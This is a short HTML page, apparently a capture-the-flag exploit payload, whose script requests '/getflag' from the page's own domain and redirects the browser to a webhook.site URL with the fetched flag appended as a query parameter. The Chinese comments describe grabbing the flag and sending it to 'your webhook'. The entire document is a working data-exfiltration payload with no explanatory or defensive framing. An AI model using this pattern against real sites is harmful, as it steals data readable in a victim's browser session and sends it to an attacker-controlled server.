<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Auto Flag Fetch</title>
</head>
<body>
  <script>
    // 對原本 domain 發送請求 → 拿 flag
    fetch('/getflag')
      .then(r => r.text())
      .then(flag => {
        // 丟到你 webhook
        location = 'https://webhook.site/8383a61e-a074-48ac-8286-61f9e2314fec?f=' + encodeURIComponent(flag);
      });
  </script>
</body>
</html>
